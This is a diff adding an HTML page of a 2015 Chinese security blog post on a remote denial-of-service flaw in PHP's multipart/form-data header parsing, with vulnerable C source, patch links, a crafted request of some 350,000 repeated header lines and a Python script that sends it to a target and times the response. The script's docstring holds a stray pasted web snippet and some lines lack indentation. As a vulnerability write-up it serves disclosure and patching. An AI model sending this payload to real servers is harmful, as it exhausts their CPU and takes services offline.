@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。">
+  <meta name="generator" content="Hugo 0.20.2" />
+
+  <title>【安全】PHP Multipartform-data 远程DOS攻击漏洞 &middot; inorz.net</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="http://inorz.net/img/favicon.ico" type="image/x-icon" />
+
+  
+  
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+  <a class="pure-menu-heading brand" href="/">inorz.net</a>
+
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>主页</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>文章列表</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>关于我</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>没想好</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/*" target="_blank"><i class="fa fa-twitter-square fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/*" target="_blank"><i class="fa fa-facebook-square fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://plus.google.com/+*" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://weibo.com/*" target="_blank"><i class="fa fa-weibo fa-fw"></i>Weibo</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+
+  <div>
+  <div class="small-print">
+    <small></small>
+  </div>
+  <div class="small-print">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>【安全】PHP Multipartform-data 远程DOS攻击漏洞</h1>
+  <h2>PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。</h2>
+</div>
+<div class="content">
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>2015-05-21 14:45:48</time>
+  </div>
+
+  
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="http://inorz.net/tags/php">php</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="http://inorz.net/tags/%E5%AE%89%E5%85%A8">安全</a>
+    
+  </div>
+  
+  
+
+</div>
+
+  <h3 id="漏洞摘要">【漏洞摘要】</h3>
+
+<p>　　PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。
+ 　　</p>
+
+<h3 id="影响范围">【影响范围】</h3>
+
+<p>　　PHP所有版本</p>
+
+<p></p>
+
+<h3 id="解决方案">【解决方案】</h3>
+
+<p>　　1. 5.2.17 ：<a href="https://coding.net/u/simapple/p/oldphppatch/git/blob/master/CVE-ID2015-4024/php5.2patch">一个民间的补丁</a>
+　　2. 5.4.X 直接升级到最新的5.4.41</p>
+
+<h3 id="漏洞入口">【漏洞入口】</h3>
+
+<p>　　PHP源码中main/ rfc1867.c负责解析multipart/form-data协议，DOS漏洞出现在main/rfc46675pxultipart_buffer_headers函数。
+　　在详细分析漏洞函数前，先分析进入漏洞函数的路径。PHP解析multipart/form-data http请求体的入口函数在SAPI_POST_HANDLER_FUNC(rfc1867.c中的函数)，代码如下。SAPI_POST_HANDLER_FUNC函数首先解析请求的boundary。</p>
+
+<pre><code class="language-c">/* Get the boundary */
+boundary= strstr(content_type_dup, &quot;boundary&quot;);
+ if(!boundary) {
+     intcontent_type_len = strlen(content_type_dup);
+     char*content_type_lcase = estrndup(content_type_dup, content_type_len);
+
+     php_strtolower(content_type_lcase,content_type_len);
+     boundary= strstr(content_type_lcase, &quot;boundary&quot;);
+     if(boundary) {
+             boundary= content_type_dup + (boundary - content_type_lcase);
+     }
+     efree(content_type_lcase);
+  }
+  if(!boundary || !(boundary = strchr(boundary, '='))) {
+       sapi_module.sapi_error(E_WARNING,&quot;Missing boundary in multipart/form-data POST data&quot;);
+       return;
+   }
+   boundary++;
+   boundary_len= strlen(boundary);
+   …
+   …
+   while(!multipart_buffer_eof(mbuff TSRMLS_CC))
+   {
+                   charbuff[FILLUNIT];
+                   char*cd = NULL, *param = NULL, *filename = NULL, *tmp = NULL;
+                   size_tblen = 0, wlen = 0;
+                   off_toffset;
+
+                   zend_llist_clean(&amp;header);
+
+                   if(!multipart_buffer_headers(mbuff, &amp;header TSRMLS_CC)) {
+                            gotofileupload_done;
+                   }
+
+</code></pre>
+
+<h3 id="漏洞原理">【漏洞原理】</h3>
+
+<p>　　在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符&rsquo;:&lsquo;，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块。该代码块进行1次内存分配，2次内存拷贝，1次内存释放。当value值越来越长，将消耗大量的cpu时间。如果以拷贝一个字节为时间复杂度单位，value的长度为m，时间复杂度为m*m.</p>
+
+<pre><code class="language-c">prev_len= strlen(prev_entry.value);
+     cur_len= strlen(line);
+
+     entry.value= emalloc(prev_len + cur_len + 1); //1次分片内存
+     memcpy(entry.value,prev_entry.value, prev_len); //1次拷贝
+     memcpy(entry.value+ prev_len, line, cur_len);   //1次拷贝
+     entry.value[cur_len+ prev_len] = '\0';
+
+     entry.key= estrdup(prev_entry.key);
+
+     zend_llist_remove_tail(header);//1次内存释放
+</code></pre>
+
+<h3 id="漏洞利用">【漏洞利用】</h3>
+
+<p>　　构造像以下恶意的http请求，当存在350000行a\n时，在我的测试环境中，一个http请求将消耗10s的cpu时间。每隔若干秒，同时并发多个请求，将导致server端cpu资源长期耗尽，从而到达DOS。总的来说，利用方式和Hash Collision DOS一样。</p>
+
+<pre><code class="language-c">------WebKitFormBoundarypE33TmSNWwsMphqz
+Content-Disposition:form-data; name=&quot;file&quot;; filename=&quot;s
+a
+a
+a
+…
+…
+…
+a&quot;
+Content-Type:application/octet-stream
+
+why is it?
+------WebKitFormBoundarypE33TmSNWwsMphqz
+</code></pre>
+
+<h3 id="漏洞测试">【漏洞测试】</h3>
+
+<pre><code class="language-python">'''
+Author: Shusheng Liu,The Department of Security Cloud, Baidu
+email: liusscs@163.com
+/* &lt;![CDATA[ */!function(){try{var t=&quot;currentScript&quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&quot;script&quot;),e=t.length;e--;)if(t[e].getAttribute(&quot;cf-hash&quot;))return t[e]}();if(t&amp;&amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&quot;data-cfemail&quot;);if(a){for(e=&quot;&quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&gt; */
+'''
+import sys
+import urllib,urllib2
+import datetime
+from optparse import OptionParser
+
+def http_proxy(proxy_url):
+
+    proxy_handler = urllib2.ProxyHandler({&quot;http&quot; : proxy_url})
+    null_proxy_handler = urllib2.ProxyHandler({})
+    opener = urllib2.build_opener(proxy_handler)
+    urllib2.install_opener(opener)
+#end http_proxy
+
+def check_php_multipartform_dos(url,post_body,headers):
+    req = urllib2.Request(url)
+    for key in headers.keys():
+        req.add_header(key,headers[key])
+    starttime = datetime.datetime.now();
+    fd = urllib2.urlopen(req,post_body)
+    html = fd.read()
+    endtime = datetime.datetime.now()
+    usetime=(endtime - starttime).seconds
+    if(usetime &gt; 5):
+        result = url+&quot; is vulnerable&quot;;
+    else:
+        if(usetime &gt; 3):
+            result = &quot;need to check normal respond time&quot;
+    return [result,usetime]
+#end
+
+
+def main():
+    #http_proxy(&quot;http://127.0.0.1:8089&quot;)
+    parser = OptionParser()
+    parser.add_option(&quot;-t&quot;, &quot;--target&quot;, action=&quot;store&quot;,
+                  dest=&quot;target&quot;,
+                  default=False,
+          type=&quot;string&quot;,
+                  help=&quot;test target&quot;)
+    (options, args) = parser.parse_args()
+    if(options.target):
+    target = options.target
+    else:
+    return;
+
+    Num=350000
+    headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
+            'Accept-Encoding':'gzip, deflate',
+            'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
+    body = &quot;------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=sp.jpg&quot;
+    payload=&quot;&quot;
+    for i in range(0,Num):
+        payload = payload + &quot;a\n&quot;
+    body = body + payload;
+    body = body + &quot;Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--&quot;
+    print &quot;starting...&quot;;
+    respond=check_php_multipartform_dos(target,body,headers)
+    print &quot;Result : &quot;
+    print respond[0]
+    print &quot;Respond time : &quot;+str(respond[1]) + &quot; seconds&quot;;
+
+if __name__==&quot;__main__&quot;:
+    main()
+</code></pre>
+
+<h3 id="参考">【参考】</h3>
+
+<p>　　1. <a href="https://bugs.php.net/bug.php?id=69364">https://bugs.php.net/bug.php?id=69364</a>
+　　2. <a href="http://php.net/ChangeLog-5.php#5.5.25">http://php.net/ChangeLog-5.php#5.5.25</a>
+　　3. <a href="http://drops.wooyun.org/papers/6077">http://drops.wooyun.org/papers/6077</a></p>
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
+    
+    <a href="http://inorz.net/2015/05/20/%E8%A7%A3%E5%86%B3mac%E6%89%93%E5%8C%85%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%9C%A8windows%E4%B8%8B%E4%B9%B1%E7%A0%81/"><i class="fa fa-chevron-left"></i></a>
+    
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="prev">
+      <a href="http://inorz.net/2015/05/20/%E8%A7%A3%E5%86%B3mac%E6%89%93%E5%8C%85%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%9C%A8windows%E4%B8%8B%E4%B9%B1%E7%A0%81/">解决MAC打包压缩文件在Windows下乱码</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="next">
+      <a href="http://inorz.net/2015/05/24/centos%E4%B8%8Bprivoxy%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/">Centos下Privoxy的安装与配置</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
+    
+    <a href="http://inorz.net/2015/05/24/centos%E4%B8%8Bprivoxy%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"><i class="fa fa-chevron-right"></i></a>
+    
+  </div>
+</div>
+
+
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'Your Disqus shortname';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+</div>
+
+</div>
+</div>
+<script src="http://inorz.net/js/ui.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'Your Google Analytics tracking ID', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+</body>
+</html>
+
